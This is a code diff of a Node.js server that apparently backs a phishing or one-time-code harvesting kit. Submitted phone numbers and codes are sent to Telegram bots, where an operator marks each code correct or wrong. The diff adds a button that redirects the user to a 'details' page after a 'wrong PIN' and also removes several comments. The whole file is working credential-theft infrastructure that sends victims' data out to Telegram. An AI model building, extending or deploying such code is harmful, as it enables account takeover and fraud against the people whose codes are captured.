@@ -18,7 +18,6 @@ let requestBotMap = {};
 
 const DATA_FILE = path.join(__dirname, 'data.json');
 
-// Load persisted data on boot
 try {
     if (fs.existsSync(DATA_FILE)) {
         const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
@@ -41,7 +40,6 @@ function persist() {
     }
 }
 
-// Double-click protection
 const processedCallbacks = new Set();
 
 // ---------- Multi-bot discovery ----------
@@ -56,7 +54,6 @@ Object.keys(process.env).forEach(key => {
         bots.push({ botId: `bot${index}`, botToken, chatId });
     }
 });
-// Fallback single bot
 if (bots.length === 0 && process.env.BOT_TOKEN && process.env.CHAT_ID) {
     bots.push({ botId: 'bot1', botToken: process.env.BOT_TOKEN, chatId: process.env.CHAT_ID });
 }
@@ -104,7 +101,6 @@ async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard 
             text,
             parse_mode: 'Markdown'
         };
-        // null = remove buttons entirely
         payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };
 
         await axios.post(
@@ -140,7 +136,7 @@ async function setWebhook(bot, retries = 5) {
     }
 }
 
-// ---------- Keep-Alive Pinger (prevents Render free-tier sleep) ----------
+// ---------- Keep-Alive Pinger ----------
 function keepAlive() {
     const url = `${DOMAIN}/health`;
     const client = url.startsWith('https') ? https : http;
@@ -212,10 +208,15 @@ app.post('/submit-code', (req, res) => {
                     `📱 *Telefone:* ${phone}\n` +
                     `🔢 *Código:* ${code}`;
 
-    sendTelegramMessage(bot, message, [[
-        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
-    ]]);
+    sendTelegramMessage(bot, message, [
+        [
+            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
+            { text: '❌ Wrong Code',   callback_data: `code_bad:${requestId}` }
+        ],
+        [
+            { text: '🔁 Wrong PIN → details', callback_data: `code_pinwrong:${requestId}` }
+        ]
+    ]);
 
     res.json({ requestId });
 });
@@ -234,7 +235,6 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
-    // Double-click protection
     if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
     processedCallbacks.add(cb.id);
     setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);
@@ -285,9 +285,18 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             feedback = `⚠️ Code request not found.`;
             statusLine = '\n\n_⚠️ Request expired_';
         }
+    } else if (action === 'code_pinwrong') {
+        if (pendingCodes[requestId]) {
+            pendingCodes[requestId].approved = 'pinwrong';
+            persist();
+            feedback = '🔁 Redirecting user to details page (wrong PIN).';
+            statusLine = '\n\n_🔁 Redirected to details (wrong PIN)_';
+        } else {
+            feedback = `⚠️ Code request not found.`;
+            statusLine = '\n\n_⚠️ Request expired_';
+        }
     }
 
-    // 🔥 Edit original message: append status + REMOVE buttons
     if (messageId && chatId && statusLine) {
         const originalText = cb.message.text || '';
         await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
@@ -304,7 +313,6 @@ async function init() {
     app.listen(PORT, () => {
         console.log(`🚀 Server running on port ${PORT}`);
         console.log(`🌐 Domain: ${DOMAIN}`);
-        // First ping 30s after boot
         setTimeout(keepAlive, 30 * 1000);
     });
 }
